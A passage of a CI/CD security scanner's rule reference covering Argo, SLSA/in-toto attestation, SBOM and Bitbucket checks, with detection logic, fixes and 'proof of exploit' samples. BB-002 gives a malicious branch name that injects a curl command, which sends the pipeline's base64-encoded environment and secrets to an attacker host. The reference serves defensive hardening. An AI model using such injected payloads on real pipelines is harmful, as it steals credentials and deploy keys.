**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``witness run``, ``attest-build-provenance``).

**Recommendation.** Add a ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` step after the build template, or use ``witness run`` to record the build environment. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`ARGO-011`](../providers/argo.md#argo-011) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-012 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec. Walks every Argo document and passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner template. ``trivy fs /workdir`` for source / filesystem; ``trivy image <ref>`` for container images. ``grype``, ``snyk``, ``npm audit``, ``pip-audit`` are alternatives. Fail the template on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`ARGO-012`](../providers/argo.md#argo-012) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-013`: Argo workflow does not opt out of SA token automount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-013 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Companion to ARGO-003 (default ServiceAccount). The default SA only matters when its token is mounted; an explicit ``automountServiceAccountToken: false`` removes the token from the pod regardless of which SA the pod is bound to. Detection: workflow passes when the spec sets it to ``false`` AND every template either inherits that or sets its own ``automountServiceAccountToken: false``. A template with it explicitly ``true`` (or unset against an unset spec-level value) is the failing shape.

**Recommendation.** Set ``spec.automountServiceAccountToken: false`` on the Workflow / WorkflowTemplate, or per-template (``templates[].automountServiceAccountToken: false``) on any template that doesn't need to talk to the Kubernetes API. An explicit ``false`` keeps a compromised step from using the workflow's SA token to escalate inside the cluster, even when the SA itself is hardened (ARGO-003), a token automounted into every pod widens the leak surface.

**Known false positives.**

- Templates that genuinely need to call the Kubernetes API (GitOps pull, ``kubectl apply`` from inside the workflow). Set ``automountServiceAccountToken: true`` on that template specifically and bind it to a least-privilege SA, the rule then fires only on the broad spec-level absence, which is the actual gap.

**Source:** [`ARGO-013`](../providers/argo.md#argo-013) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-014`: Argo template script runs unpinned package install <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-014 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Drone. Argo was a gap; this closes it.

Walks ``script.source`` plus joined ``container.args`` / ``container.command`` text per template. Steps and tasks across DAG / steps templates are equally in scope because they all reduce to a container with a shell payload.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (ARGO-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific template name.

**Source:** [`ARGO-014`](../providers/argo.md#argo-014) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-015`: Input artifact pulls from an insecure (non-HTTPS) URL <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-015 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Argo Workflows resolves input artifacts before the template's container starts. The source can be ``http``, ``git``, ``s3``, ``gcs``, ``azure``, ``hdfs``, ``oss``, or ``raw``. The rule fires when:

- ``http.url`` starts with ``http://`` (cleartext fetch)
- ``git.repo`` starts with ``git://`` (legacy unauthenticated git protocol, no integrity)
- ``s3.endpoint`` is set with ``insecure: true`` (explicit TLS bypass)

Other artifact sources are skipped, an OCI / S3 / GCS pull carries its own integrity / signing posture that lives outside this rule.

**Recommendation.** Pull every input artifact over HTTPS. Replace ``http://`` with ``https://`` in any ``http.url:`` block, and use ``https://`` git remote URLs instead of ``git://``, ``ssh://``-without-key-pinning, or anonymous-cleartext access. Plain HTTP fetches let any on-path attacker swap the artifact bytes for a different payload, and Argo will execute whatever bytes arrive without an integrity check unless the artifact source provides one (S3 + checksum, OCI + digest). If the artifact source genuinely doesn't ship over HTTPS (a legacy internal mirror), wrap it in a CDN or proxy that adds TLS, then pin the artifact by checksum on the consuming side.

**Known false positives.**

- Local-mirror development workflows occasionally use ``http://`` against an internal registry that's only reachable from a private network. The integrity guarantee still relies on network isolation rather than transport encryption; suppress on the specific template name when this is the deliberate shape.

**Source:** [`ARGO-015`](../providers/argo.md#argo-015) in the [Argo Workflows provider](../providers/argo.md).

### `ATTEST-001`: SLSA provenance attests an untrusted builder identity <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-001 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Reads the SLSA provenance from each in-toto Statement carried in the image's attestation manifests, then checks ``predicate.builder.id`` (SLSA v0.2) / ``predicate.runDetails.builder.id`` (SLSA v1) against an allowlist of URI prefixes for hosted CI builders. Fires when the attested builder is unknown or matches a self-hosted-runner shape.

Triggering this rule means the bytes of the runtime image were produced by a builder identity the SLSA contract cannot vouch for. A compromised self-hosted runner can produce a perfectly-formed, signature-valid attestation for a tampered image, so a passing OCI-002 (attestation present) is not the same thing as a trustworthy attestation, this rule is the difference.

**Recommendation.** Re-run the build on a recognized hosted CI builder (GitHub-hosted runners, slsa-github-generator, Cloud Build, GitLab SaaS, Buildkite, or BuildKit attesting via Docker Hub) so the SLSA ``builder.id`` claim resolves to an isolated, publicly-auditable build environment. Self-hosted runners and unknown builder identities defeat the SLSA L2+ isolation guarantee, the supply-chain trust chain only extends as far as the *builder* the attestation names.

**Known false positives.**

- Some teams run their own SLSA-conformant builders for policy reasons (air-gapped builds, regulated workloads, FedRAMP environments). Add the builder's URI prefix to a future allowlist override (deferred to v2) or suppress via ignore-file when the team has a documented review of the builder's isolation posture.
- Older BuildKit versions emitted a generic placeholder (``https://github.com/docker/buildx@v0.X``) without tying the identity to the runner. Modern Buildx writes a concrete builder URI; if the scan flags a placeholder, upgrade Buildx and rebuild before treating it as a real incident.

**Seen in the wild.**

- [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
- [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.

**Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-002`: SLSA provenance source-repo claim is missing or unverifiable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-002 }

**Evidences:** [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** The ``builder.id`` claim that ATTEST-001 verifies tells you *who* built the image. The source-repo claim ATTEST-002 verifies tells you *what* they built. Both are required for the SLSA chain to be meaningful: a trusted builder running an unknown source produces a signed attestation for code you can't audit.

The rule walks the SLSA provenance predicate for a source URI. Path varies by spec version:
  - v0.2: ``predicate.invocation.configSource.uri``
  - v1.0: ``predicate.buildDefinition.externalParameters`` (builder-specific, commonly ``.workflow.repository`` or ``.source.uri``)
Fires when:
  - no URI is present anywhere on the expected paths;
  - the URI is a known placeholder (empty, ``?``, ``unknown``, ``n/a``);
  - the URI doesn't parse as a recognizable VCS / HTTPS shape;
  - a URI is present but the corresponding digest field is missing or all-zeros (the bytes aren't actually pinned).

**Recommendation.** Ensure the build emits SLSA provenance with a concrete source-repo URI plus a commit-level digest. For SLSA v0.2 that's ``predicate.invocation.configSource.uri`` + ``configSource.digest`` (typically ``sha1`` for git refs). For SLSA v1, ``predicate.buildDefinition.externalParameters`` should name the workflow's source repository, and ``predicate.buildDefinition.resolvedDependencies`` should include the same source pinned by digest. A missing or placeholder URI ('', 'unknown', 'n/a') leaves consumers unable to confirm what code produced the image.

**Known false positives.**

- Some SLSA Phase-0 attestations omit the digest field on purpose, the build was reproducible-by-source rather than pinned to a commit. Suppress via ignore-file when the team has documented this trade-off; the default expectation for any image promoted to a production registry is a concrete commit pin.
- Builders that emit free-form ``externalParameters`` shapes (some self-hosted SLSA implementations) may carry the source URI under a non-canonical key. The rule walks every string value in ``externalParameters`` looking for a VCS URI; if none is found, the finding fires. Add the builder to a future allowlist override (deferred) when the shape is intentional.

**Seen in the wild.**

- [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.

**Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-003`: SBOM contains floating-version dependencies <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-003 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** ATTEST-001 verifies the builder; ATTEST-002 verifies the source; ATTEST-003 verifies the *contents* of what was shipped. A signed SBOM that declares ``openssl`` version ``latest`` is worse than no SBOM, the signature gives the rot a stamp of approval. Vulnerability-scanning tooling that reads the SBOM produces false negatives because the version it queries CVE databases for is unstable.

Detection walks every SBOM attestation (predicate types starting with ``https://spdx.dev/Document`` or ``https://cyclonedx.org/bom``) and checks each declared package's version field against a floating-shape regex. A package is considered pinned when its version matches a concrete release identifier (semver, calver, sha-style digest, or any git tag with at least one numeric component).

**Recommendation.** Pin every dependency in the SBOM to a concrete version (a released semver, a digest, or a tag-plus-commit pair). Floating values like ``latest``, ``*``, ``master``, an empty string, or a bare major like ``v1`` defeat the SBOM's purpose: a consumer can't reproduce or vulnerability-scan what they don't have a fixed version of. SPDX 2.x carries version under ``packages[*].versionInfo``; CycloneDX uses ``components[*].version``. Both fields are optional in the spec but operationally required for any meaningful SBOM consumption.

**Known false positives.**

- Some SBOM emitters legitimately leave ``versionInfo`` empty for system-injected components the build couldn't resolve (e.g. ``glibc`` from the base image when the image was built without distro metadata). Suppress via ignore-file scoped to the manifest path when the SBOM was produced in a context that intentionally elides those entries; for production-bound images the expectation is full version coverage.
- Source-only components (a Git repo bundled into a builder stage) sometimes carry the branch name in version. Long-term that's still a floating reference (the branch tip moves), so the rule fires by design; switch to tag+digest pinning before suppressing.

**Seen in the wild.**

- [Log4Shell downstream impact](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) (CVE-2021-44228): organizations with SBOMs at the ready could ship patches in hours; those without (or with floating-version SBOMs) spent days auditing builds to discover what they actually shipped. The ``log4j-core@latest`` shape was the worst case — the SBOM said the right name but no consumer could pin which exact bytes were in production.
- Common SBOM-quality findings (NTIA SBOM Minimum Elements report, 2021): version completeness consistently the lowest-scoring dimension across producers. Floating versions account for the bulk of unconsumed SBOMs in vulnerability-management pipelines.

**Source:** [`ATTEST-003`](../providers/oci.md#attest-003) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-004`: SLSA provenance ships without a resolved-dependencies set <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-004 }

**Evidences:** [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Walks every SLSA provenance attestation on the image index and reads the materials list at the spec-version-appropriate path. Both v0.2 and v1 are accepted. A missing key, a non-list value, and an empty list all fail (each shape means the consumer gets no input chain-of-custody). Per-material content validation (digest map populated, URI well-formed) is deferred to a future rule, this one establishes that the list exists.

Pairs with ATTEST-003: ATTEST-003 verifies the SBOM covers package-level inputs, ATTEST-004 verifies the build-level inputs. Both are needed for the SLSA Build-track L3 'isolated, reproducible' claim; SBOM-only coverage misses the resolved base image and the build-tool chain.

**Recommendation.** Configure the builder to emit a non-empty ``materials`` (SLSA v0.2) or ``resolvedDependencies`` (SLSA v1) list with one entry per ingredient the build consumed. For BuildKit, set ``--attest=type=provenance,mode=max`` so the resolved-base-image + checked-out source land in the attestation. For slsa-github-generator the L3 presets populate this automatically; teams running a custom generator must add the inputs explicitly. An empty list is structurally indistinguishable from 'the build had no inputs' and breaks downstream vulnerability correlation.

**Known false positives.**

- Trivial ``FROM scratch`` images with no build-time dependencies legitimately have an empty materials list. The rule has no way to distinguish 'trivial build' from 'instrumentation gap', the SLSA spec treats both as the same fail-closed signal. Suppress per-image via ``--ignore-file`` once you've verified the build genuinely has nothing to attest.
- Some builders (older BuildKit, hand-rolled generators) populate ``materials`` but omit the ``digest`` map, which the SLSA spec marks recommended-not-required. This rule accepts that shape today (list non-empty = pass); a future ATTEST-NNN will tighten to require digest coverage.

**Seen in the wild.**

- [SLSA v1 spec, Build track L3 requirements](https://slsa.dev/spec/v1.0/levels#build-l3): resolved dependencies are a Build-track requirement, not an optional courtesy. The provenance was supposed to answer 'what went into this artifact'; an empty resolvedDependencies list answers 'we declined to say', which is materially worse than 'we didn't produce an attestation' because consumers see a signed-and-stamped document and trust it.
- tj-actions/changed-files compromise (CVE-2025-30066, March 2025): forensic teams reconstructing the blast radius needed to know which downstream images consumed the compromised action's outputs. Builds whose provenance carried materials lists pinpointed the exposure in minutes; builds without paid for the gap in days of manual review.

**Proof of exploit.**

```
# Vulnerable: a hand-rolled or older-Buildx provenance
# emitter ships a Statement whose materials list is empty.
# (Modern BuildKit ``--attest=type=provenance`` populates a
# materials list by default; ``mode=max`` enriches it with
# decoded build args / fuller layer metadata, but the
# rule fires structurally on missing/empty regardless of
# which emitter produced the output.)

# Resulting provenance (SLSA v0.2 predicate):
#   {
#     "builder": {"id": "https://my-internal-ci/runner@v3"},
#     "buildType": "https://example.com/buildtype/v1",
#     "invocation": { ... configSource present ... },
#     "materials": []          <-- empty
#   }

# Attack surface: a downstream CVE advisory for the
# resolved base image (say, ubuntu:22.04 -> a specific
# digest known to ship the vulnerable libcurl) can't be
# correlated to this image because the provenance never
# recorded which base image was resolved at build time.
# Forensic response shifts from "grep provenance for
# affected digest" to "rebuild every image and inspect
# layer contents."

# Safe: use a builder that emits resolved materials. For
# BuildKit that's any recent Buildx with
# ``--attest=type=provenance`` (default mode already
# populates the list; pass ``mode=max`` if you also want
# decoded build args + fuller layer metadata).
$ docker buildx build \
    --attest=type=provenance,mode=max \
    --tag registry.example/app:v1.4.2 \
    --push .

# Resulting provenance:
#   "materials": [
#     {"uri": "pkg:docker/ubuntu@22.04",
#      "digest": {"sha256": "<resolved digest>"}},
#     {"uri": "git+https://github.com/foo/bar@v1.4.2",
#      "digest": {"sha1": "<commit sha>"}}
#   ]
```

**Source:** [`ATTEST-004`](../providers/oci.md#attest-004) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-005`: In-toto Statement subject is missing or unpinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-005 }

**Evidences:** [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Walks every parsed in-toto Statement (SLSA provenance + SBOM both) and validates the subject array. Three failure shapes:
  - ``subject`` is missing or an empty list, the Statement attests nothing.
  - A subject entry has no ``digest`` map, the entry names an artifact but doesn't bind to its bytes.
  - A digest value is empty, all-zeros, or not valid hex, the bind exists structurally but the value is a placeholder.

Hex validation is conservative: the value must consist entirely of ``0-9`` and ``a-f`` (case-insensitive) and the length must be a multiple of two (a valid byte encoding). Algorithm-specific length checks (``sha256`` = 64 chars, ``sha1`` = 40) are not enforced here, some registries truncate to a 16-char prefix and the rule accepts those as long as the bytes are well-formed.

**Recommendation.** Configure the builder to emit Statements with a non-empty ``subject`` array whose entries each carry a populated ``digest`` map. The digest value must be a real hex encoding of the artifact's bytes, an empty string or all-zeros placeholder defeats verification. For BuildKit this is automatic when ``--attest=type=provenance`` is set alongside ``--push``; older Buildx versions sometimes emitted Statements with empty subjects, upgrade if you see this fire on a recent build. For slsa-github-generator and cosign-attested workflows the subject is populated by the framework, an empty subject usually means a custom attestor was wired up incorrectly.

**Known false positives.**

- Some experimental attestor implementations emit Statements with placeholder subjects for in-flight verification (the bytes are still being uploaded when the attestation is signed). Suppress per-manifest via ``--ignore-file`` if the team has a documented review of the deferred-binding pattern; the default expectation for any image promoted to a production registry is a subject digest that matches the actual image bytes.
- Multi-subject Statements (one attestation covering multiple sibling artifacts) are accepted, as long as *every* entry has a populated digest. A partially-filled subject array fires because the unbound entries are the substitution surface, the rest don't compensate.

**Seen in the wild.**

- [in-toto Statement spec](https://github.com/in-toto/attestation/blob/main/spec/v1/statement.md): the subject digest is the cryptographic bind between a signed envelope and the artifact bytes. A placeholder value reduces the attestation to a free-floating signature attackers can re-attach.
- [SLSA v1.0 verifying artifacts](https://slsa.dev/spec/v1.0/verifying-artifacts): consumers MUST compare the attestation's subject digest against the artifact they're about to use. A signed envelope whose subject is unbound to artifact bytes passes signature verification but fails this comparison step trivially — which is exactly what an attacker exploits when re-attaching a valid signature to a tampered image.

**Proof of exploit.**

```
# Vulnerable: a Statement signed by a trusted builder but
# carrying an empty subject digest. The signature is valid;
# the bind to the image bytes is not.
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {"name": "image", "digest": {"sha256": ""}}
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": { ... }
}

# Attack: an attacker who can re-publish the signed DSSE
# envelope (the envelope is public on the OCI registry the
# image is pushed to) attaches it to a tampered image. The
# consumer's verifier checks the signature (valid, the
# builder did sign this Statement), checks the source repo
# (valid, ATTEST-002 passes), checks the builder identity
# (valid, ATTEST-001 passes), and never gets to compare
# the subject digest because the digest is empty. Result:
# the tampered image looks fully attested.

# Safe: subject digest populated with the actual image
# config digest BuildKit / slsa-github-generator emit by
# default when wired up correctly.
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {"name": "image",
     "digest": {
       "sha256": "4d5a6e7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f70819"
                    "a2b3c4d5e6f70819a2b3c4d5e6f70819"
     }}
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": { ... }
}
```

**Source:** [`ATTEST-005`](../providers/oci.md#attest-005) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-006`: SLSA provenance lacks a meaningful buildType <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-006 }

**Evidences:** [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Reads the ``buildType`` claim at the spec-appropriate path: v0.2 at ``predicate.buildType``, v1 at ``predicate.buildDefinition.buildType``. Fires when the claim is missing, an empty string, or a known placeholder (``example.com``, ``unknown``, ``n/a``, ``tbd``). A well-shaped buildType is a URI with a scheme and a path component; the rule does a conservative URI-shape check to catch typos like a bare repository name or an unfilled template token.

Doesn't validate that the URI is reachable or that the schema it names is one a verifier knows about; that's policy-layer work (an allowlist of trusted buildType URIs is a separate consumer-side concern).

**Recommendation.** Configure the builder to emit a concrete ``buildType`` URI naming the schema the provenance follows. For slsa-github-generator that's automatic (``https://github.com/slsa-framework/slsa-github-generator/<workflow>@<ref>``). For BuildKit the canonical URI is ``https://github.com/Attestations/GitHubHostedActions@v1`` or one of the SLSA-listed build types at https://slsa.dev/buildtypes/. Custom in-house generators should publish their own buildType URI that points at a stable schema doc; the URI doesn't need to be globally registered, but it does need to be resolvable so consumers can review the schema.

**Known false positives.**

- Some experimental generators emit a buildType under a placeholder URI during development (``https://example.com/buildtype/v1``). The rule fires on those by design; the canonical fix is to publish a real schema URI before any image ships to a registry that downstream consumers trust. Suppress per-manifest via ``--ignore-file`` only when the team has a documented review of the placeholder's intended scope.
- BuildKit < v0.10 emitted Statements without a buildType field at all. Modern Buildx always populates it; if the rule fires on a current build, the provenance configuration is likely incomplete rather than the Buildx version being too old.

**Seen in the wild.**

- [SLSA v1.0 provenance spec](https://slsa.dev/spec/v1.0/provenance): buildType is REQUIRED on every Statement. The spec calls out that consumers MUST refuse provenance whose buildType they don't recognize, which means an under-specified buildType reduces the attestation to advisory text the verifier can't act on.
- [SLSA build types catalog](https://slsa.dev/buildtypes/): the publicly registered buildType URIs SLSA-aware tooling knows how to verify. Provenance that names an unregistered URI is acceptable when paired with a documented schema, but provenance with no URI at all is structurally unverifiable.

**Proof of exploit.**

```
# Vulnerable: a self-rolled SLSA generator that omits the
# buildType field. The predicate carries every other
# claim (builder, materials, configSource) but consumers
# can't tell which schema those claims follow.
{
  "_type": "https://in-toto.io/Statement/v1",
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "externalParameters": {...},
      "resolvedDependencies": [...]
      // no buildType key
    },
    "runDetails": {"builder": {"id": "..."}}
  }
}

# Attack surface: a consumer verifying this Statement with
# a policy of 'only accept buildType = <list>' has no field
# to match against. Two common downstream outcomes:
#   1. The verifier rejects every Statement (over-strict);
#   2. The verifier accepts every Statement (over-loose),
#      which means an attacker forging materials in a
#      different schema slips by because the verifier
#      can't tell the schemas apart.

# Safe: emit a concrete buildType URI. For slsa-github-
# generator the framework fills this in automatically:
{
  "predicate": {
    "buildDefinition": {
      "buildType": "https://github.com/slsa-framework/"
                    "slsa-github-generator/generic@v2",
      ...
    }
  }
}
```

**Source:** [`ATTEST-006`](../providers/oci.md#attest-006) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-007`: SBOM packages lack supplier / originator attribution <span class="pg-sev pg-sev--low">LOW</span> { #detail-attest-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Walks every SBOM attestation (SPDX + CycloneDX) and counts components / packages without supplier attribution. SPDX checks ``packages[*].supplier``; CycloneDX checks ``components[*].supplier.name`` (the spec uses an object with a ``name`` key, unlike SPDX's bare string). A package passes when the field exists, is non-empty, and isn't the ``NOASSERTION`` sentinel.

Severity LOW because the failure mode is downstream correlation friction rather than direct execution risk. Pair with ATTEST-003 (version completeness) for the full SBOM-quality story; an SBOM that has versions but no suppliers, or suppliers but no versions, is only half actionable.

**Recommendation.** Configure the SBOM emitter to populate supplier and (where applicable) originator fields for every component. Syft / Trivy / cdxgen all support supplier inference from package-manager metadata; the field is most often missing because the generator was invoked without the relevant ecosystem authority configured. For hand-rolled SBOM pipelines, derive ``supplier`` from the package registry (``pkg:npm/foo`` -> ``Organization: https://npmjs.com``) or the upstream maintainer's published metadata. ``NOASSERTION`` is acceptable only when the package truly has no identifiable supplier; treating it as a routine default defeats downstream attribution.

**Known false positives.**

- Air-gapped builds where the SBOM emitter genuinely cannot resolve a supplier (private registry without ecosystem metadata) legitimately ship ``NOASSERTION`` for affected packages. Suppress per-manifest via ``--ignore-file`` when the gap is documented; the default expectation for any image promoted to a production registry is supplier attribution on every third-party component.
- System-injected components (``glibc`` from a distroless base image, kernel symbols) sometimes carry no supplier because the SBOM emitter didn't have distro metadata available. The rule fires by design; the canonical fix is to provide a supplier of last resort (e.g. the base image vendor) rather than to suppress.

**Seen in the wild.**

- [NTIA SBOM Minimum Elements report](https://www.ntia.gov/files/ntia/publications/sbom_minimum_elements_report.pdf) (2021): supplier name is listed as a minimum required element. NTIA's quality assessment of real-world SBOMs consistently flagged supplier coverage as one of the lowest-scoring dimensions across producers.
- Typosquat and mirror-replay supply-chain incidents (the broad class behind event-stream, ua-parser-js, and tj-actions): the attacker substitutes a package whose name + version match a legitimate one but whose supplier differs. SBOMs with supplier attribution let downstream consumers detect the substitution by comparing publisher identity; SBOMs without it carry no signal at all.

**Source:** [`ATTEST-007`](../providers/oci.md#attest-007) in the [OCI manifest provider](../providers/oci.md).

### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.

**Recommendation.** Pin every `pipe:` to a full semver tag (e.g. `atlassian/aws-s3-deploy:1.4.0`) or to an immutable SHA. Floating majors like `:1` can roll to new code silently.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.

**Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.

**Known false positives.**

- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.

**Proof of exploit.**

```
# Vulnerable: branch name interpolated unquoted into shell.
image: alpine:latest
pipelines:
  pull-requests:
    '**':
      - step:
          name: triage
          script:
            - echo Building $BITBUCKET_BRANCH
            - ./scripts/build.sh $BITBUCKET_BRANCH

# Attack: open a PR from a branch whose name is shell:
#
#   git checkout -b 'foo;curl https://attacker/x \
#     -d "$(env|base64)";:'
#
# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
# the shell parses the line, so the `;` becomes a command
# separator and the curl exfils the step's env (which holds
# every repository / workspace variable in scope, including
# deploy keys configured for the pipeline).

# Safe: double-quote and pass via env so the value is only
# consumed as data.
      - step:
          name: triage
          script:
            - echo "Building $BRANCH"
            - ./scripts/build.sh "$BRANCH"
          # Bitbucket has no declarative env block; assign
          # via shell so the value is captured as a single
          # argv element from the controlled assignment.
          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)
```

**Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-003 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Scans `definitions.variables` and each step's `variables:` for entries whose KEY looks credential-shaped and whose VALUE is a literal string. AWS access keys are detected by value shape regardless of key name.

**Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.

**Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).

